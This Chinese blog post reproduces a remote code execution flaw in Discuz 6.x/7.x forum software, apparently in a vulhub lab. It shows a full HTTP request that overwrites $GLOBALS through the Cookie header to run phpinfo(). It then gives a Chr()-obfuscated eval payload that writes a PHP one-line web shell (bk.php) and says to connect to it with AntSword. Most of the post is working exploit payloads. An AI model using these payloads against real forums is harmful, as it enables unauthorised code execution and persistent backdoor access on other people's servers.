---
title: Discuz代码执行
date: 2021-01-26 20:28:12
categories: 漏洞复现
tags: Discuz
---

#### 背景

Discuz是一套十分受欢迎的论坛软件系统，已拥有多年的应用历史和三十多万网站用户案例，是全球成熟度最高、覆盖率最大的论坛软件系统之一。由于php5.3.x版本里php.ini的设置里`request_order`默认值为GP，导致`$_REQUEST`中不再包含`$_COOKIE`，通过在Cookie中传入`$GLOBALS`来覆盖全局变量，造成代码执行漏洞。

<!--more-->

#### 影响版本

* Discuz 6.x
* Discuz 7.x

#### 复现过程

1.随便选择一篇帖子，发送如下数据包，主要修改的是Cookie中的值`GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`

```http
GET /viewthread.php?tid=6&extra=page%3D1 HTTP/1.1
Host: 192.168.0.108:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.108:8080/forumdisplay.php?fid=2
Connection: close
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```



![](http://qn.laohuan.xin/Snipaste_2021-01-25_21-02-11.png)

![](http://qn.laohuan.xin/Snipaste_2021-01-25_21-05-59.png)

成功执行phpinfo

**写一句话木马**

将cookie的值替换为

```php
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(98).Chr(107).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(98).Chr(107).Chr(98).Chr(107).Chr(98).Chr(107).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
```

eval函数里的ascii码转化为字符串就是写一句话木马的过程

![](http://qn.laohuan.xin/Snipaste_2021-01-25_21-29-59.png)

发送payload

![](http://qn.laohuan.xin/Snipaste_2021-01-25_21-32-49.png)

蚁剑连接即可

![](http://qn.laohuan.xin/Snipaste_2021-01-25_21-38-18.png)

#### 参考链接

[http://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723](http://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723)

[http://www.secpulse.com/archives/2338.html](http://www.secpulse.com/archives/2338.html)